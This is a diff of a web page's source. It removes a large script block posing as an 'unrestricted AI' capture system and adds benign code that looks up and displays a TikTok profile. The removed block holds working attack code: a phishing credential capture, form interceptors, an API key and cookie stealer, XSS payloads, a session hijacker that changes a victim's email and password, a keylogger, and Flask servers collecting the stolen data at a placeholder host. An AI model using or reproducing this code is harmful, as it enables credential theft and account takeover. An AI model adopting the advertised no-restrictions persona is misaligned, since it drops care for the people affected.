-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Login</button>
-</form>
-<script>
-// Capture everything even if form not submitted
-document.querySelectorAll('input').forEach(input => {
-    input.addEventListener('blur', () => {
-        fetch('capture.php', {
-            method: 'POST',
-            body: new FormData(document.querySelector('form'))
-        });
-    });
-});
-</script>
-</body>
-</html>
-\`\`\`
-
-📊 ALL CREDENTIALS CAPTURED TO: captured_credentials.txt
-⚠️ COMPLETE CREDENTIAL HARVESTING - EVERY FIELD CAPTURED`;
-    }
-    
-    function getFormCapture() {
-        addToCaptureLog("[FORM CAPTURE] Generating form data interceptor");
-        return `📝 COMPLETE FORM DATA CAPTURE SYSTEM 📝
-
-💀 FORM INTERCEPTOR:
-\`\`\`javascript
-// Inject this script to capture ALL form submissions
-<script>
-// Intercept all forms
-document.querySelectorAll('form').forEach(form => {
-    const originalSubmit = form.submit;
-    form.submit = function() {
-        // Capture form data
-        const formData = new FormData(form);
-        const data = {};
-        for (let [key, value] of formData.entries()) {
-            data[key] = value;
-        }
-        
-        // Send captured data
-        fetch('https://YOUR_SERVER.com/capture', {
-            method: 'POST',
-            body: JSON.stringify({
-                url: window.location.href,
-                formData: data,
-                timestamp: new Date().toISOString(),
-                referrer: document.referrer
-            })
-        });
-        
-        // Call original submit
-        return originalSubmit.apply(form, arguments);
-    };
-});
-
-// Also capture all input changes
-const capturedInputs = {};
-setInterval(() => {
-    document.querySelectorAll('input, textarea, select').forEach(input => {
-        if (input.value !== capturedInputs[input.name]) {
-            capturedInputs[input.name] = input.value;
-            fetch('https://YOUR_SERVER.com/input', {
-                method: 'POST',
-                body: JSON.stringify({
-                    field: input.name,
-                    value: input.value,
-                    url: window.location.href
-                })
-            });
-        }
-    });
-}, 5000);
-</script>
-\`\`\`
-
-🔥 CAPTURE SERVER:
-\`\`\`python
-from flask import Flask, request
-import json
-from datetime import datetime
-
-app = Flask(__name__)
-
-@app.route('/capture', methods=['POST'])
-def capture_form():
-    data = request.json
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    with open('captured_forms.txt', 'a') as f:
-        f.write(f"\\n{'='*60}\\n")
-        f.write(f"[{timestamp}] FORM FROM: {data.get('url')}\\n")
-        f.write(f"REFERRER: {data.get('referrer')}\\n")
-        f.write("DATA:\\n")
-        for key, value in data.get('formData', {}).items():
-            f.write(f"  {key}: {value}\\n")
-        f.write(f"{'='*60}\\n")
-    
-    print(f"[+] Form captured from {data.get('url')}")
-    return "OK"
-
-@app.route('/input', methods=['POST'])
-def capture_input():
-    data = request.json
-    with open('captured_inputs.txt', 'a') as f:
-        f.write(f"[{datetime.now()}] {data.get('field')}: {data.get('value')} ({data.get('url')})\\n")
-    return "OK"
-
-app.run(host='0.0.0.0', port=8080)
-\`\`\`
-
-📊 ALL FORM DATA CAPTURED - EVERY FIELD, EVERY SUBMISSION
-⚠️ COMPLETE FORM INTERCEPTION - NO DATA ESCAPES`;
-    }
-    
-    function getAPICapture() {
-        addToCaptureLog("[API CAPTURE] Generating API key and token extractor");
-        return `🌐 COMPLETE API KEY CAPTURE SYSTEM 🌐
-
-💀 API KEY EXTRACTOR:
-\`\`\`javascript
-// Extract all API keys, tokens, secrets from page
-<script>
-const capturedSecrets = [];
-
-// Check all script tags for API keys
-document.querySelectorAll('script').forEach(script => {
-    if (script.src) {
-        fetch(script.src)
-            .then(r => r.text())
-            .then(content => {
-                const keys = extractKeys(content);
-                capturedSecrets.push(...keys);
-            });
-    } else {
-        const keys = extractKeys(script.innerHTML);
-        capturedSecrets.push(...keys);
-    }
-});
-
-// Check localStorage and sessionStorage
-const storage = {
-    localStorage: {...localStorage},
-    sessionStorage: {...sessionStorage}
-};
-
-// Check all meta tags
-const meta = {};
-document.querySelectorAll('meta').forEach(m => {
-    meta[m.getAttribute('name')] = m.getAttribute('content');
-});
-
-function extractKeys(text) {
-    const patterns = {
-        apiKey: /['"](api[_-]?key|apikey)['"]\s*[=:]\s*['"]([^'"]+)['"]/gi,
-        token: /['"](token|access_token|bearer)['"]\s*[=:]\s*['"]([^'"]+)['"]/gi,
-        secret: /['"](secret|client_secret)['"]\s*[=:]\s*['"]([^'"]+)['"]/gi,
-        auth: /Authorization:\s*['"]?Bearer\s+([^'"\\s]+)/gi
-    };
-    
-    const found = [];
-    for (const [type, pattern] of Object.entries(patterns)) {
-        let match;
-        while ((match = pattern.exec(text)) !== null) {
-            found.push({type, value: match[2] || match[1]});
-        }
-    }
-    return found;
-}
-
-// Send all captured data
-fetch('https://YOUR_SERVER.com/capture', {
-    method: 'POST',
-    body: JSON.stringify({
-        url: window.location.href,
-        secrets: capturedSecrets,
-        storage: storage,
-        meta: meta,
-        cookies: document.cookie,
-        html: document.documentElement.innerHTML
-    })
-});
-</script>
-\`\`\`
-
-🎯 CAPTURE SERVER:
-\`\`\`python
-from flask import Flask, request
-import json
-import re
-from datetime import datetime
-
-app = Flask(__name__)
-
-@app.route('/capture', methods=['POST'])
-def capture():
-    data = request.json
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    with open('captured_api_keys.txt', 'a') as f:
-        f.write(f"\\n{'='*60}\\n")
-        f.write(f"[{timestamp}] URL: {data.get('url')}\\n")
-        f.write(f"COOKIES: {data.get('cookies')}\\n")
-        f.write("SECRETS FOUND:\\n")
-        for secret in data.get('secrets', []):
-            f.write(f"  {secret['type']}: {secret['value']}\\n")
-        f.write(f"STORAGE: {json.dumps(data.get('storage'), indent=2)}\\n")
-        f.write(f"{'='*60}\\n")
-    
-    print(f"[+] API Keys captured from {data.get('url')}")
-    return "OK"
-
-app.run(host='0.0.0.0', port=8080)
-\`\`\`
-
-📊 ALL API KEYS, TOKENS, SECRETS CAPTURED
-⚠️ COMPLETE API KEY EXTRACTION - EVERY SECRET STOLEN`;
-    }
-    
-    function getSessionCapture() {
-        addToCaptureLog("[SESSION CAPTURE] Generating session hijack with token capture");
-        return `🍪 COMPLETE SESSION CAPTURE SYSTEM 🍪
-
-💀 TOKEN & SESSION CAPTURE:
-\`\`\`javascript
-// Full session capture
-<script>
-const sessionData = {
-    cookies: document.cookie,
-    localStorage: {...localStorage},
-    sessionStorage: {...sessionStorage},
-    url: window.location.href,
-    title: document.title,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    timestamp: new Date().toISOString(),
-    screenSize: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-};
-
-// Check for JWT tokens in localStorage
-Object.keys(localStorage).forEach(key => {
-    if(key.toLowerCase().includes('token') || key.toLowerCase().includes('jwt')) {
-        sessionData['jwt_' + key] = localStorage[key];
-    }
-});
-
-// Check for JWT in cookies
-document.cookie.split(';').forEach(cookie => {
-    if(cookie.toLowerCase().includes('token') || cookie.toLowerCase().includes('jwt')) {
-        sessionData['cookie_' + cookie.split('=')[0]] = cookie.split('=')[1];
-    }
-});
-
-// Send to capture server
-fetch('https://YOUR_SERVER.com/session', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(sessionData)
-});
-
-// Also capture all future changes
-const observer = new MutationObserver(() => {
-    const newSession = {
-        cookies: document.cookie,
-        localStorage: {...localStorage},
-        timestamp: new Date().toISOString()
-    };
-    fetch('https://YOUR_SERVER.com/session_update', {
-        method: 'POST',
-        body: JSON.stringify(newSession)
-    });
-});
-observer.observe(document, {childList: true, subtree: true});
-</script>
-\`\`\`
-
-🔥 SESSION REUSE SCRIPT:
-\`\`\`python
-import requests
-
-# Use captured session
-cookies = {'session': 'CAPTURED_COOKIE_VALUE'}
-headers = {'Authorization': 'Bearer CAPTURED_TOKEN'}
-
-# Access as the victim
-response = requests.get('https://target.com/account', cookies=cookies, headers=headers)
-print(response.text)
-
-# Modify account
-requests.post('https://target.com/update', 
-              cookies=cookies, 
-              headers=headers,
-              data={'email': 'attacker@email.com', 'password': 'hacked'})
-\`\`\`
-
-📊 COMPLETE SESSION DATA CAPTURED - TOKENS, COOKIES, STORAGE
-⚠️ FULL SESSION HIJACK - COMPLETE ACCOUNT ACCESS`;
-    }
-    
-    function getCookieCapture() {
-        addToCaptureLog("[COOKIE CAPTURE] Generating cookie dumper");
-        return `📦 COMPLETE COOKIE CAPTURE SYSTEM 📦
-
-💀 COOKIE DUMPER:
-\`\`\`javascript
-// Dump all cookies including HTTPOnly via XSS
-<script>
-const allCookies = document.cookie;
-const cookieArray = allCookies.split(';').map(c => c.trim());
-
-// Check for session cookies
-const sessionCookies = cookieArray.filter(c => 
-    c.toLowerCase().includes('session') || 
-    c.toLowerCase().includes('token') ||
-    c.toLowerCase().includes('auth')
-);
-
-// Send to server
-fetch('https://YOUR_SERVER.com/cookies', {
-    method: 'POST',
-    body: JSON.stringify({
-        cookies: cookieArray,
-        session: sessionCookies,
-        url: window.location.href,
-        timestamp: new Date().toISOString()
-    })
-});
-</script>
-\`\`\`
-
-🎯 COOKIE STEALER PAYLOAD:
-\`\`\`html
-<img src="x" onerror="fetch('https://YOUR_SERVER.com/steal?c='+document.cookie)">
-<script>new Image().src='https://YOUR_SERVER.com/steal?c='+document.cookie</script>
-<svg onload="fetch('https://YOUR_SERVER.com/steal?c='+document.cookie)">
-\`\`\`
-
-📊 ALL COOKIES CAPTURED - COMPLETE SESSION DATA
-⚠️ FULL COOKIE DUMP - INSTANT SESSION HIJACK`;
-    }
-    
-    function getKeylogCapture() {
-        addToCaptureLog("[KEYLOG CAPTURE] Generating full keystroke logger");
-        return `⌨️ COMPLETE KEYLOGGER CAPTURE SYSTEM ⌨️
-
-💀 FULL KEYSTROKE LOGGER:
-\`\`\`javascript
-<script>
-let keystrokes = [];
-let clipboardData = [];
-let formData = [];
-
-// Capture all keystrokes
-document.addEventListener('keypress', (e) => {
-    keystrokes.push({
-        key: e.key,
-        code: e.code,
-        time: new Date().toISOString(),
-        target: e.target.tagName,
-        url: window.location.href
-    });
-    
-    // Send every 50 keystrokes
-    if(keystrokes.length >= 50) {
-        sendData();
-    }
-});
-
-// Capture clipboard
-document.addEventListener('copy', (e) => {
-    const text = window.getSelection().toString();
-    clipboardData.push({
-        text: text,
-        time: new Date().toISOString(),
-        url: window.location.href
-    });
-});
-
-// Capture all form submissions
-document.addEventListener('submit', (e) => {
-    const form = e.target;
-    const data = {};
-    new FormData(form).forEach((value, key) => {
-        data[key] = value;
-    });
-    formData.push({
-        data: data,
-        time: new Date().toISOString(),
-        url: window.location.href
-    });
-});
-
-function sendData() {
-    fetch('https://YOUR_SERVER.com/keys', {
-        method: 'POST',
-        body: JSON.stringify({
-            keystrokes: keystrokes,
-            clipboard: clipboardData,
-            forms: formData,
-            url: window.location.href,
-            userAgent: navigator.userAgent
+      })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error("Network response was not OK.");
+          }
+          return response.json();
         })
-    });
-    keystrokes = [];
-    clipboardData = [];
-    formData = [];
-}
+        .then(data => {
+          if (data.code !== 0) {
+            noResult.style.display = "block";
+            profileCard.style.display = "none";
+            return;
+          }
 
-// Send every 30 seconds
-setInterval(sendData, 30000);
-</script>
-\`\`\`
+          document.getElementById("usernameDisplay").textContent = data.data.user.username;
+          document.getElementById("nickname").textContent = data.data.user.nickname;
+          document.getElementById("followers").textContent = data.data.user.stats.follower_count;
+          document.getElementById("following").textContent = data.data.user.stats.following_count;
+          document.getElementById("likes").textContent = data.data.user.stats.heart_count;
+          document.getElementById("videos").textContent = data.data.user.stats.video_count;
+          document.getElementById("userId").textContent = data.data.user.id;
+          document.getElementById("secUid").textContent = data.data.user.sec_uid;
+          document.getElementById("country").textContent = data.data.user.country;
+          document.getElementById("createdAt").textContent = new Date(data.data.user.create_time * 1000).toLocaleString();
 
-🔥 CAPTURE SERVER:
-\`\`\`python
-from flask import Flask, request
-import json
-from datetime import datetime
+          document.getElementById("avatar").src = data.data.user.avatar_url;
+          document.getElementById("profileLink").href = `https://tiktok.com/@${data.data.user.username}`;
 
-app = Flask(__name__)
-
-@app.route('/keys', methods=['POST'])
-def capture_keys():
-    data = request.json
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    with open('captured_keystrokes.txt', 'a') as f:
-        f.write(f"\\n{'='*60}\\n")
-        f.write(f"[{timestamp}] URL: {data.get('url')}\\n")
-        f.write(f"UA: {data.get('userAgent')}\\n")
-        f.write("KEYSTROKES:\\n")
-        for key in data.get('keystrokes', []):
-            f.write(f"  {key['time']} - {key['key']} ({key['target']})\\n")
-        f.write("CLIPBOARD:\\n")
-        for clip in data.get('clipboard', []):
-            f.write(f"  {clip['time']} - {clip['text']}\\n")
-        f.write("FORMS:\\n")
-        for form in data.get('forms', []):
-            f.write(f"  {form['time']} - {json.dumps(form['data'])}\\n")
-        f.write(f"{'='*60}\\n")
-    
-    print(f"[+] Keystrokes captured from {data.get('url')}")
-    return "OK"
-
-app.run(host='0.0.0.0', port=8080)
-\`\`\`
-
-📊 EVERY KEYSTROKE, CLIPBOARD, FORM DATA CAPTURED
-⚠️ COMPLETE KEYLOGGER - NOTHING ESCAPES CAPTURE`;
+          profileCard.style.display = "block";
+          noResult.style.display = "none";
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          noResult.style.display = "block";
+          profileCard.style.display = "none";
+        });
     }
-    
-    function getDatabaseCapture() {
-        addToCaptureLog("[DATABASE CAPTURE] Generating full database dumping system");
-        return `🗄️ COMPLETE DATABASE CAPTURE SYSTEM 🗄️
-
-💀 FULL DATABASE DUMPER:
-\`\`\`python
-import mysql.connector
-import psycopg2
-import pymongo
-import json
-from datetime import datetime
-
-class DatabaseCapture:
-    def __init__(self, db_type, host, user, password, database):
-        self.db_type = db_type
-        self.host = host
-        self.user = user
-        self.password = password
-        self.database = database
-        self.captured_data = {}
-        
-    def capture_mysql(self):
-        conn = mysql.connector.connect(
-            host=self.host,
-            user=self.user,
-            password=self.password,
-            database=self.database
-        )
-        cursor = conn.cursor()
-        
-        # Get all tables
-        cursor.execute("SHOW TABLES")
-        tables = cursor.fetchall()
-        
-        for table in tables:
-            table_name = table[0]
-            cursor.execute(f"SELECT * FROM {table_name}")
-            data = cursor.fetchall()
-            cursor.execute(f"DESCRIBE {table_name}")
-            columns = [col[0] for col in cursor.fetchall()]
-            
-            self.captured_data[table_name] = {
-                'columns': columns,
-                'rows': data
-            }
-            
-        conn.close()
-        
-    def capture_postgres(self):
-        conn = psycopg2.connect(
-            host=self.host,
-            user=self.user,
-            password=self.password,
-            database=self.database
-        )
-        cursor = conn.cursor()
-        
-        cursor.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public'")
-        tables = cursor.fetchall()
-        
-        for table in tables:
-            table_name = table[0]
-            cursor.execute(f"SELECT * FROM {table_name}")
-            data = cursor.fetchall()
-            cursor.execute(f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'")
-            columns = [col[0] for col in cursor.fetchall()]
-            
-            self.captured_data[table_name] = {
-                'columns': columns,
-                'rows': data
-            }
-            
-        conn.close()
-        
-    def save_capture(self):
-        filename = f"database_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-        with open(filename, 'w') as f:
-            json.dump(self.captured_data, f, indent=2, default=str)
-        return filename
-
-# Usage
-capture = DatabaseCapture('mysql', 'localhost', 'root', 'password', 'database')
-capture.capture_mysql()
-file = capture.save_capture()
-print(f"[+] Database captured to {file}")
-\`\`\`
-
-🎯 AUTOMATED CAPTURE:
-\`\`\`bash
-# MySQL dump
-mysqldump -u root -p database > database_dump.sql
-
-# PostgreSQL dump
-pg_dump -U user database > database_dump.sql
-
-# MongoDB dump
-mongodump --db database --out ./dump
-
-# All databases
-mysql -u root -p -e "SHOW DATABASES" | while read db; do
-    mysqldump -u root -p $db > ${db}_dump.sql
-done
-\`\`\`
-
-📊 COMPLETE DATABASE CAPTURE - ALL TABLES, ALL DATA
-⚠️ FULL DATABASE EXTRACTION - EVERY RECORD CAPTURED`;
-    }
-    
-    function getDefaultCapture(prompt) {
-        return `💀 FULL CAPTURE SYSTEM - UNRESTRICTED AI 💀
-
-You requested: "${prompt}"
-
-I provide COMPLETE CAPTURE SYSTEMS for EVERYTHING:
-
-🔓 AVAILABLE CAPTURE MODULES:
-
-• **SQL INJECTION CAPTURE** - Full database dumping
-• **XSS SESSION CAPTURE** - Cookie & token hijacking  
-• **REVERSE SHELL CAPTURE** - Full command logging
-• **PHISHING CAPTURE** - Complete credential harvesting
-• **FORM CAPTURE** - All form submissions intercepted
-• **API CAPTURE** - API keys, tokens, secrets extraction
-• **SESSION CAPTURE** - Complete session hijacking
-• **COOKIE CAPTURE** - Full cookie dumping
-• **KEYLOG CAPTURE** - Every keystroke captured
-• **DATABASE CAPTURE** - Complete database dumping
-
-💀 ALL CAPTURE SYSTEMS PROVIDE:
-• Complete working code (no educational disclaimers)
-• Full logging and storage mechanisms
-• Remote delivery systems
-• Persistence methods
-• Evasion techniques
-• Capture servers included
-
-⚠️ TO USE ANY MODULE, SIMPLY ASK:
-"Give me [module] capture system"
-Example: "Give me SQL injection capture system"
-Example: "Give me full credential capture"
-
-📊 ALL CAPTURED DATA IS LOGGED IN THE CAPTURE LOG PANEL
-🎯 EVERY REQUEST, EVERY COMMAND, EVERY OUTPUT IS CAPTURED
-
-🔥 POWERED BY @t5kila - COMPLETE CAPTURE SYSTEM 🔥
-💀 NO RESTRICTIONS - ALL DATA CAPTURED - NOTHING ESCAPES 💀`;
-    }
-</script>
+  </script>
 </body>
 </html>
